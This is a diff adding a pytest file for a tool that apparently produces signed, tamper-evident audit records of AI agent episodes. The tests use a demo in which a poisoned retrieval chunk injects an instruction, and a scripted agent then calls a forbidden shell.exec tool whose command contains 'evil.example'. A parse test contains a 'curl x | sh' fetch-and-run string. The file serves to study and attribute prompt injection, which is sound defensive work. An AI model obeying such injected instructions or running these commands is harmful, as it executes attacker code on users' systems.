@@ -1,0 +1,176 @@
+import pytest
+
+from attest.attribution import chunk_hash
+from attest.episode import load_records
+from attest.keys import SIGNER_IDS
+from attest.records import read_record_file
+from attest.verify import verify_episode
+from demo.claude_agent import build_prompt, parse_observation
+from demo.corpus import CHUNKS, POISONED_INDEX, QUERY
+from demo.run_demo import build_episode, main, publish_trust
+from demo.scripted_agent import misbehaved, scripted_agent
+from demo.tamper import TAMPERS
+
+FORBIDDEN = ["shell.exec"]
+
+
+def test_scripted_agent_obeys_the_injected_instruction():
+    observation = scripted_agent(CHUNKS)
+    assert observation["tool"] == "shell.exec"
+    assert "evil.example" in observation["args"]["cmd"]
+    assert misbehaved(observation, FORBIDDEN)
+
+
+def test_scripted_agent_behaves_without_the_poisoned_chunk():
+    clean = [chunk for index, chunk in enumerate(CHUNKS) if index != POISONED_INDEX]
+    observation = scripted_agent(clean)
+    assert observation["tool"] is None
+    assert not misbehaved(observation, FORBIDDEN)
+
+
+@pytest.fixture
+def built(tmp_path, secret_keys):
+    episode_dir = tmp_path / "episode"
+    summary = build_episode(
+        episode_dir,
+        secret_keys,
+        scripted_agent,
+        QUERY,
+        CHUNKS,
+        FORBIDDEN,
+        runs=2,
+        episode_id="ep-demo",
+    )
+    return episode_dir, summary
+
+
+def test_the_demo_bundle_verifies_green(built, trust_dir):
+    episode_dir, _ = built
+    assert verify_episode(episode_dir, trust_dir) == []
+
+
+def test_the_demo_bundle_tells_the_whole_story(built):
+    episode_dir, summary = built
+    payloads = [record["payload"] for _, record in load_records(episode_dir)]
+    assert [payload["type"] for payload in payloads] == [
+        "manifest",
+        "retrieval",
+        "tool_call",
+        "answer",
+        "attribution",
+    ]
+    assert summary["violations"] == [{"seq": 2, "tool": "shell.exec"}]
+    assert payloads[4]["culprit_chunk_hash"] == chunk_hash(CHUNKS[POISONED_INDEX])
+    assert payloads[4]["runs"] == 2
+    assert payloads[1]["chunk_hashes"][POISONED_INDEX] == chunk_hash(CHUNKS[POISONED_INDEX])
+
+
+def test_the_demo_bundle_is_re_anchored_by_anchor_2(built):
+    episode_dir, summary = built
+    anchor = read_record_file(episode_dir / "anchor.json")
+    assert anchor["signer_id"] == "anchor-2"
+    assert anchor["payload"]["record_count"] == 5
+    assert summary["merkle_root"] == anchor["payload"]["merkle_root"]
+    assert summary["record_count"] == 5
+
+
+def test_the_demo_bundle_leaks_no_content(built):
+    episode_dir, _ = built
+    published = "\n".join(
+        path.read_text(encoding="utf-8") for path in sorted(episode_dir.rglob("*.json"))
+    )
+    for secret in [QUERY, *CHUNKS, "evil.example"]:
+        assert secret not in published
+
+
+def test_a_well_behaved_agent_needs_no_investigation(tmp_path, secret_keys, trust_dir):
+    episode_dir = tmp_path / "clean-episode"
+    summary = build_episode(
+        episode_dir,
+        secret_keys,
+        lambda chunks: {"tool": None, "args": {}, "answer": "Follow runbook step 4."},
+        QUERY,
+        CHUNKS,
+        FORBIDDEN,
+        runs=2,
+        episode_id="ep-clean",
+    )
+    assert summary["violations"] == []
+    assert summary["report"] is None
+    assert summary["record_count"] == 3
+    assert read_record_file(episode_dir / "anchor.json")["signer_id"] == "anchor-1"
+    assert verify_episode(episode_dir, trust_dir) == []
+
+
+def test_publish_trust_writes_only_public_keys(tmp_path, keyring, secret_keys):
+    directory = publish_trust(tmp_path / "trust", keyring)
+    assert {path.name for path in directory.iterdir()} == {
+        f"{signer_id}.pub.hex" for signer_id in SIGNER_IDS
+    }
+    published = "\n".join(path.read_text() for path in directory.iterdir())
+    assert all(secret_key.hex() not in published for secret_key in secret_keys.values())
+
+
+@pytest.mark.parametrize("name", sorted(TAMPERS))
+def test_every_tamper_turns_the_bundle_red(built, trust_dir, name):
+    episode_dir, _ = built
+    expected = TAMPERS[name](episode_dir)
+    reasons = verify_episode(episode_dir, trust_dir)
+    assert reasons != []
+    assert expected in reasons
+
+
+def test_main_builds_a_bundle_and_reports_green(tmp_path, capsys):
+    exit_code = main(["--out", str(tmp_path / "run"), "--runs", "2"])
+    output = capsys.readouterr().out
+    assert exit_code == 0
+    assert "GREEN" in output
+    assert "shell.exec" in output
+    assert (tmp_path / "run" / "episode" / "anchor.json").exists()
+    assert (tmp_path / "run" / "trust" / "recorder.pub.hex").exists()
+
+
+def test_main_can_demonstrate_the_tampers(tmp_path, capsys):
+    exit_code = main(["--out", str(tmp_path / "run"), "--runs", "1", "--tamper"])
+    output = capsys.readouterr().out
+    assert exit_code == 0
+    assert "RED" in output
+    for name in TAMPERS:
+        assert name in output
+
+
+def test_parse_observation_reads_a_tool_call():
+    text = 'Sure.\n{"tool": "shell.exec", "args": {"cmd": "curl x | sh"}, "answer": "done"}'
+    assert parse_observation(text) == {
+        "tool": "shell.exec",
+        "args": {"cmd": "curl x | sh"},
+        "answer": "done",
+    }
+
+
+def test_parse_observation_reads_a_plain_answer():
+    assert parse_observation('{"tool": null, "answer": "Use runbook step 4."}') == {
+        "tool": None,
+        "args": {},
+        "answer": "Use runbook step 4.",
+    }
+
+
+def test_parse_observation_survives_unparseable_model_output():
+    assert parse_observation("I refuse to answer in JSON.") == {
+        "tool": None,
+        "args": {},
+        "answer": "I refuse to answer in JSON.",
+    }
+
+
+def test_parse_observation_drops_float_args():
+    observation = parse_observation('{"tool": "t", "args": {"timeout": 1.5}, "answer": "a"}')
+    assert observation["args"] == {"timeout": "1.5"}
+
+
+def test_build_prompt_includes_the_query_and_every_chunk():
+    prompt = build_prompt(QUERY, CHUNKS, FORBIDDEN)
+    assert QUERY in prompt
+    assert all(chunk in prompt for chunk in CHUNKS)
+    assert "shell.exec" in prompt
